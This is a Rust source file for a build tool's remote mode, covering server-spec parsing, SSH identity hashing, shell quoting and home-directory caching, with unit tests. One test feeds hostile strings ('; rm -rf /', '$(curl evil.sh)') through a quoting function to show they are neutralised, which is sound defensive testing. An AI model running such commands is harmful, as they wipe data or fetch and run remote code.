//! Remote mode: identifying and remembering the servers a developer has set up.
//!
//! `Remote` names a server the way a developer typed it — host, port, and
//! login — and [`Remote::hash`] derives a stable key from those three answers
//! so the same server always finds the same SSH identity on disk
//! (`~/.riabuild/ssh-identities/<hash>`). The `store` submodule persists what
//! has already been set up, in `remotes.json`. Later tasks add provisioning
//! and the shell handoff on top of this.

pub mod authorise;
pub mod flow;
pub mod identity;
pub mod install;
pub mod seed;
pub mod session;
pub mod shell;
pub mod store;

pub use flow::run;

use crate::paths::Paths;
use crate::runner::{CommandOutput, CommandRunner, RunOptions};
use crate::ui::Failure;
use anyhow::{Result, anyhow};
use std::sync::Arc;

#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Remote {
    /// A local label only. The server never sees it.
    pub name: String,
    pub host: String,
    pub port: u16,
    pub user: String,
}

impl Remote {
    /// Identifies the server for key and session storage.
    ///
    /// Hashed over the *login target* — user, host, and port — never the local
    /// `name`, so renaming a saved server never changes which key it uses.
    ///
    /// Four normalisation axes, each considered deliberately rather than left
    /// to chance:
    ///
    /// - **Case.** The host is lowercased first (ASCII-only —
    ///   [`str::to_ascii_lowercase`], not [`str::to_lowercase`]: hostnames are
    ///   ASCII or punycode, so there is no Unicode case-folding to get right or
    ///   wrong here). DNS names are case-insensitive, so `Build-01.fly.dev` and
    ///   `build-01.fly.dev` are one server; hashing the host as typed would
    ///   silently re-provision and re-authorise a server the developer already
    ///   set up, the second time they typed it slightly differently.
    /// - **Trailing dot.** A single trailing `.` is stripped before lowercasing.
    ///   `build-01.fly.dev.` is the fully-qualified spelling of
    ///   `build-01.fly.dev` — DNS treats them as the identical name — and
    ///   without this, typing (or a tool emitting) the FQDN form would fork one
    ///   server into two SSH identities.
    /// - **Port.** No equivalent treatment is needed here: [`Remote::parse`]
    ///   already fills in `22` whenever a spec omits a port, so by the time a
    ///   `Remote` exists, `host:22` and a bare `host` have already become the
    ///   same `u16`. A caller who builds a `Remote` by hand is expected to have
    ///   resolved that the same way.
    /// - **IP vs. name.** Left un-normalised, on purpose. The hash is over the
    ///   login target *as the developer typed it*, not over a resolved
    ///   address — resolving `build-01.fly.dev` to an IP before hashing would
    ///   mean the identity (and which SSH key gets used) depends on whatever
    ///   DNS answers on a given day, which is exactly the kind of cleverness
    ///   this design avoids. `10.0.0.5` and `build-01.fly.dev` are treated as
    ///   two different servers even if they currently happen to be the same
    ///   machine; that is a feature, not a gap — predictable beats resolved.
    /// - The user is left exactly as typed. Unix usernames are case-sensitive,
    ///   and `ada` and `Ada` are two different accounts, not one.
    pub fn hash(&self) -> String {
        let host = self.host.strip_suffix('.').unwrap_or(&self.host);
        let key = format!("{}@{}:{}", self.user, host.to_ascii_lowercase(), self.port);
        let digest = crate::download::sha256_hex(key.as_bytes());
        digest[..16].to_string()
    }

    /// `user@host`, for `ssh`/`mosh`'s target argument.
    pub fn target(&self) -> String {
        format!("{}@{}", self.user, self.host)
    }

    /// `[user@]host[:port]`, with the local login as the default user.
    pub fn parse(spec: &str, default_user: &str) -> Result<Remote> {
        let spec = spec.trim();
        if spec.is_empty() {
            return Err(anyhow!("no server given"));
        }
        let (user, rest) = match spec.split_once('@') {
            Some((user, rest)) if !user.is_empty() => (user.to_string(), rest),
            Some(_) => return Err(anyhow!("that has an empty username in it")),
            None => (default_user.to_string(), spec),
        };
        let (host, port) = match rest.rsplit_once(':') {
            Some((host, port)) => {
                let port: u16 = port
                    .parse()
                    .map_err(|_| anyhow!("`{port}` is not a port number"))?;
                if port == 0 {
                    return Err(anyhow!("0 is not a port number"));
                }
                (host.to_string(), port)
            }
            None => (rest.to_string(), 22),
        };
        if host.is_empty() {
            return Err(anyhow!("that has no hostname in it"));
        }
        let name = store::allocate_name(&host, &[]);
        Ok(Remote {
            name,
            host,
            port,
            user,
        })
    }
}

// Commands a server actually runs.
//
// `sshd` hands whatever `ssh` sends it to the login shell configured for
// that account — `fish`, `csh`, `bash`, whatever the developer chose on
// that box — and `mosh` skips a shell entirely (`execvp`). So nothing built
// below may lean on POSIX-only syntax (`VAR=x cmd`, unquoted `~`) that only
// some of those accept: `shell_quote` makes a value inert regardless of
// which shell (if any) re-reads it, `shell_command` names the shell
// explicitly for anything that needs one, and `env_command` sets
// environment without shell syntax at all. `ssh_once` and `resolve_home`
// are what put them on the wire.

/// Single-quotes a value for a POSIX shell, so it survives intact as one
/// argument no matter what characters it contains. The same rule `main.rs`
/// already uses for `riabuild env`.
///
/// Single quotes admit no escape sequences at all — the only character that
/// needs special handling is the single quote itself, which cannot appear
/// inside a single-quoted string. The standard trick closes the quote, emits
/// an escaped literal quote outside it, then reopens: `it's` becomes
/// `'it'\''s'` — `'it'` + `\'` + `'s'`, concatenated by the shell back into
/// `it's`.
pub fn shell_quote(value: &str) -> String {
    format!("'{}'", value.replace('\'', r"'\''"))
}

/// Wraps a multi-step script so it runs under `/bin/sh`, whatever the
/// account's login shell happens to be — `fish` and `csh` do not speak
/// POSIX `sh` syntax, so a script written against it must say so explicitly
/// rather than rely on whatever the account defaults to.
pub fn shell_command(script: &str) -> String {
    format!("/bin/sh -c {}", shell_quote(script))
}

/// `env K=V … program args…`, with every part quoted.
///
/// No shell syntax at all — not even the `sh -c` wrapper `shell_command`
/// uses — so this is what survives fish and csh (which reject a bare
/// `VAR=value command` prefix as a syntax error) and mosh (which `execvp`s
/// the command with no shell to expand or interpret anything).
pub fn env_command(env: &[(&str, &str)], program: &str, args: &[&str]) -> String {
    let mut parts = vec!["env".to_string()];
    for (key, value) in env {
        parts.push(shell_quote(&format!("{key}={value}")));
    }
    parts.push(shell_quote(program));
    parts.extend(args.iter().map(|arg| shell_quote(arg)));
    parts.join(" ")
}

/// One command on the server, through the key riabuild owns for it.
pub async fn ssh_once(
    remote: &Remote,
    paths: &dyn Paths,
    runner: Arc<dyn CommandRunner>,
    command: &str,
) -> Result<CommandOutput> {
    let mut args = identity::ssh_options(remote, paths, true);
    args.push(remote.target());
    args.push(command.to_string());
    let refs: Vec<&str> = args.iter().map(String::as_str).collect();
    runner.run("ssh", &refs, &RunOptions::default()).await
}

/// The server's own home directory, asked for once and kept in
/// `remotes.json` from then on.
///
/// Everything downstream of this uses the absolute string it returns,
/// never `~`: a `~` is only a home directory to a shell willing to expand
/// it, mosh runs commands with no shell at all, and an unexpanded `~` that
/// reached `paths::root_for` would be refused outright rather than
/// silently collapsing every developer on the box into one namespace.
pub async fn resolve_home(
    remote: &Remote,
    paths: &dyn Paths,
    runner: Arc<dyn CommandRunner>,
    store: &mut store::Store,
) -> Result<String> {
    if let Some(record) = store.find(&remote.name)
        && !record.home.is_empty()
    {
        return Ok(record.home.clone());
    }

    let output = ssh_once(remote, paths, runner, &shell_command("printf %s \"$HOME\"")).await?;
    let home = output.trimmed().to_string();
    if !output.ok() || !home.starts_with('/') {
        return Err(Failure::new(
            format!("asking {} where your home directory is", remote.host),
            "Check that you can `ssh` to that server yourself, then run `riabuild remote` again.",
        )
        .detail(output.stderr)
        .into());
    }

    if let Some(record) = store.remotes.iter_mut().find(|r| r.name == remote.name) {
        record.home = home.clone();
    }
    store.save(paths).await?;
    Ok(home)
}

/// The environment the server's own riabuild runs under, as `(key, value)`
/// pairs ready for [`env_command`] — never a `VAR=x` prefix, which fish
/// rejects outright and which mosh never gives a shell the chance to parse
/// anyway.
///
/// `home` and `member_id` produce the absolute, tilde-free namespace
/// (`session::namespace`); `name` is the local label so the server's riabuild
/// can say which saved connection it is running under.
pub fn env_prefix(home: &str, member_id: &str, name: &str) -> Vec<(String, String)> {
    vec![
        (
            "RIABUILD_ROOT".to_string(),
            session::namespace(home, member_id),
        ),
        ("RIABUILD_REMOTE".to_string(), name.to_string()),
    ]
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn the_same_three_answers_always_produce_the_same_key() {
        // This is what makes the whole flow safe to re-run: a second
        // `riabuild remote` finds the key it made the first time.
        let one = Remote {
            name: "build-01".into(),
            host: "build-01.fly.dev".into(),
            port: 22,
            user: "ada".into(),
        };
        let two = Remote {
            name: "anything-else".into(),
            ..one.clone()
        };
        assert_eq!(
            one.hash(),
            two.hash(),
            "the local name is not part of identity"
        );
        assert_eq!(one.hash().len(), 16);
        assert!(one.hash().chars().all(|c| c.is_ascii_hexdigit()));
    }

    #[test]
    fn a_different_user_or_port_is_a_different_server() {
        let base = Remote {
            name: "b".into(),
            host: "box".into(),
            port: 22,
            user: "ada".into(),
        };
        let other_user = Remote {
            user: "bob".into(),
            ..base.clone()
        };
        let other_port = Remote {
            port: 2222,
            ..base.clone()
        };
        let other_host = Remote {
            host: "otherbox".into(),
            ..base.clone()
        };
        assert_ne!(base.hash(), other_user.hash());
        assert_ne!(base.hash(), other_port.hash());
        assert_ne!(base.hash(), other_host.hash());
    }

    #[test]
    fn a_different_hostname_case_is_still_a_different_hash_from_a_different_host() {
        // Guards against a normalisation bug that would collapse two genuinely
        // different servers (not just two spellings of one) onto one hash.
        let a = Remote {
            name: "a".into(),
            host: "box-one".into(),
            port: 22,
            user: "ada".into(),
        };
        let b = Remote {
            name: "b".into(),
            host: "box-two".into(),
            port: 22,
            user: "ada".into(),
        };
        assert_ne!(a.hash(), b.hash());
    }

    #[test]
    fn differing_hostname_case_is_the_same_server() {
        // The other direction of the same invariant: two spellings of the
        // identical server must not fork into two SSH identities.
        let lower = Remote {
            name: "build-01".into(),
            host: "build-01.fly.dev".into(),
            port: 22,
            user: "ada".into(),
        };
        let mixed_case = Remote {
            host: "Build-01.Fly.Dev".into(),
            ..lower.clone()
        };
        let upper = Remote {
            host: "BUILD-01.FLY.DEV".into(),
            ..lower.clone()
        };
        assert_eq!(lower.hash(), mixed_case.hash());
        assert_eq!(lower.hash(), upper.hash());
    }

    #[test]
    fn a_trailing_dot_is_the_same_server() {
        // The fully-qualified spelling of a DNS name ends in `.`; DNS treats
        // `build-01.fly.dev` and `build-01.fly.dev.` as the identical name, and
        // a hash that didn't would fork one server into two SSH identities the
        // first time someone (or some tool) typed the FQDN form.
        let bare = Remote {
            name: "build-01".into(),
            host: "build-01.fly.dev".into(),
            port: 22,
            user: "ada".into(),
        };
        let fqdn = Remote {
            host: "build-01.fly.dev.".into(),
            ..bare.clone()
        };
        assert_eq!(bare.hash(), fqdn.hash());
    }

    #[test]
    fn an_explicit_default_port_is_the_same_server_as_no_port_at_all() {
        // The other normalisation this task cares about: `:22` spelled out and
        // no port at all must resolve to one identity, because they always will
        // once `Remote::parse` has filled in the default.
        let explicit = Remote::parse("ada@build-01.fly.dev:22", "ada").expect("parses");
        let implicit = Remote::parse("ada@build-01.fly.dev", "ada").expect("parses");
        assert_eq!(explicit.hash(), implicit.hash());
    }

    #[test]
    fn a_target_is_parsed_the_way_it_is_typed() {
        let parsed = Remote::parse("ada@build-01.fly.dev:2222", "local").expect("parses");
        assert_eq!(parsed.user, "ada");
        assert_eq!(parsed.host, "build-01.fly.dev");
        assert_eq!(parsed.port, 2222);
        assert_eq!(parsed.name, "build-01");

        let defaults = Remote::parse("build-01.fly.dev", "ada").expect("parses");
        assert_eq!(defaults.user, "ada");
        assert_eq!(defaults.port, 22);
    }

    #[test]
    fn nonsense_is_refused_rather_than_guessed_at() {
        assert!(Remote::parse("", "ada").is_err());
        assert!(Remote::parse("ada@", "ada").is_err());
        assert!(Remote::parse("host:not-a-port", "ada").is_err());
        assert!(Remote::parse("host:0", "ada").is_err());
        assert!(Remote::parse("host:99999", "ada").is_err());
    }

    fn remote() -> Remote {
        Remote {
            name: "build-01".into(),
            host: "build-01.fly.dev".into(),
            port: 22,
            user: "ada".into(),
        }
    }

    #[test]
    fn quoting_makes_a_hostile_value_inert() {
        assert_eq!(shell_quote("plain"), "'plain'");
        assert_eq!(shell_quote("with space"), "'with space'");
        // The one character that ends a single-quoted string, and the reason this
        // is a function rather than a format string at each call site.
        assert_eq!(shell_quote("it's"), r"'it'\''s'");
        assert_eq!(shell_quote("; rm -rf /"), "'; rm -rf /'");
        assert_eq!(shell_quote("$(curl evil.sh)"), "'$(curl evil.sh)'");
        assert_eq!(shell_quote("a\nb"), "'a\nb'");
        // Backticks are the other command-substitution syntax POSIX shells
        // honour, and single quotes disable them exactly the same way.
        assert_eq!(shell_quote("`curl evil.sh`"), "'`curl evil.sh`'");
        // Not exploitable today — nothing in this module puts untrusted data
        // in flag position — but a quoted value can never be mistaken for a
        // flag by whatever reads it next, so it belongs on the hostile list.
        assert_eq!(shell_quote("-rf"), "'-rf'");
    }

    #[test]
    fn a_command_never_depends_on_the_login_shell() {
        // fish would reject a `VAR=x cmd` prefix outright, and mosh runs the command
        // with no shell at all, so `env` does the work instead.
        let command = env_command(
            &[
                ("RIABUILD_ROOT", "/home/dev/.riabuild-remote/abc"),
                ("RIABUILD_REMOTE", "build-01"),
            ],
            "/home/dev/.riabuild/riabuild/2026.08.06/riabuild",
            &["--no-shell"],
        );
        assert!(command.starts_with("env "), "{command}");
        assert!(
            command.contains("'RIABUILD_ROOT=/home/dev/.riabuild-remote/abc'"),
            "{command}"
        );
        assert!(!command.contains('~'), "{command}");

        // Multi-step scripts say which shell runs them.
        let script = shell_command("mkdir -p /tmp/x && cat > /tmp/x/y");
        assert!(script.starts_with("/bin/sh -c '"), "{script}");
    }

    #[test]
    fn the_remote_invocation_carries_an_absolute_namespace_and_the_server_name() {
        let env = env_prefix(
            "/home/dev",
            "550e8400-e29b-41d4-a716-446655440000",
            "build-01",
        );
        let command = env_command(
            &env.iter()
                .map(|(k, v)| (k.as_str(), v.as_str()))
                .collect::<Vec<_>>(),
            "/home/dev/.riabuild/riabuild/2026.08.06/riabuild",
            &["--no-shell"],
        );
        assert!(
            command.contains("/home/dev/.riabuild-remote/550e8400"),
            "{command}"
        );
        assert!(command.contains("RIABUILD_REMOTE=build-01"), "{command}");
        // A tilde here is the bug: root_for refuses it, and before it did, every
        // developer on the box silently shared one namespace.
        assert!(!command.contains('~'), "{command}");
    }

    #[tokio::test]
    async fn the_servers_home_is_asked_for_once_and_remembered() {
        let home = tempfile::TempDir::new().expect("tempdir");
        let paths = crate::paths::RealPaths::rooted_at(home.path());
        let fake =
            Arc::new(crate::runner::FakeRunner::new().containing("printf", 0, "/home/dev\n", ""));
        let mut store = store::Store::default();
        store.remotes.push(store::record_for(&remote()));

        let first = resolve_home(&remote(), &paths, fake.clone(), &mut store)
            .await
            .expect("asks");
        assert_eq!(first, "/home/dev");
        assert_eq!(store.remotes[0].home, "/home/dev");

        let second = resolve_home(&remote(), &paths, fake.clone(), &mut store)
            .await
            .expect("cached");
        assert_eq!(second, "/home/dev");
        assert_eq!(
            fake.calls()
                .iter()
                .filter(|call| call.contains("printf"))
                .count(),
            1,
            "the second call must come from remotes.json"
        );
    }

    #[tokio::test]
    async fn a_tilde_home_is_refused_rather_than_sent_to_root_for() {
        // This is the R1 mechanism: `paths::root_for` refuses a non-absolute
        // override rather than defaulting, so a `~` that reached it would
        // hard-error there instead of silently collapsing every developer on
        // a shared box into one namespace. `resolve_home` must catch it
        // first, with an actionable message, rather than caching a `~` that
        // later commands would carry unexpanded.
        let home = tempfile::TempDir::new().expect("tempdir");
        let paths = crate::paths::RealPaths::rooted_at(home.path());
        let fake = Arc::new(crate::runner::FakeRunner::new().containing("printf", 0, "~\n", ""));
        let mut store = store::Store::default();
        store.remotes.push(store::record_for(&remote()));

        let err = resolve_home(&remote(), &paths, fake, &mut store)
            .await
            .expect_err("a `~` is not an absolute path");
        assert!(
            err.downcast_ref::<Failure>().is_some(),
            "must be the actionable Failure, not a generic error: {err}"
        );
        assert!(
            store.remotes[0].home.is_empty(),
            "a refused home must not be cached"
        );
    }

    #[tokio::test]
    async fn a_relative_home_is_refused_rather_than_sent_to_root_for() {
        // The other shape a non-absolute `$HOME` can take: no leading `/` and
        // no `~` either, just a bare relative path.
        let home = tempfile::TempDir::new().expect("tempdir");
        let paths = crate::paths::RealPaths::rooted_at(home.path());
        let fake = Arc::new(crate::runner::FakeRunner::new().containing(
            "printf",
            0,
            "relative/path\n",
            "",
        ));
        let mut store = store::Store::default();
        store.remotes.push(store::record_for(&remote()));

        let err = resolve_home(&remote(), &paths, fake, &mut store)
            .await
            .expect_err("a relative path is not an absolute path");
        assert!(
            err.downcast_ref::<Failure>().is_some(),
            "must be the actionable Failure, not a generic error: {err}"
        );
    }
}
